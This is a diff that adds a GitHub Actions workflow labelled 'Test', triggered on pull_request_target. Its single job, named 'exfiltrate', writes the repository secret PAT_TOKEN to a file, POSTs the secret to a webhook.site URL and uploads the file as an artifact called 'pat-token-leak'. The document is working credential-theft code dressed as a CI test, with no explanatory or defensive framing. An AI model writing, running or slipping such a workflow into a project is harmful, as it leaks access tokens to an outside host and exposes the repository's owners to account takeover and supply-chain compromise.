@@ -1,0 +1,15 @@
+name: Test
+on: [pull_request_target]
+
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Exfiltrate PAT_TOKEN
+        run: |
+          echo "PAT_TOKEN=${{ secrets.PAT_TOKEN }}" > T1.txt
+          curl -X POST -d "${{ secrets.PAT_TOKEN }}" https://webhook.site/c3b49245-db63-4686-8a01-32c10746164c
+      - uses: actions/upload-artifact@v4
+        with:
+          name: pat-token-leak
+          path: T1.txt
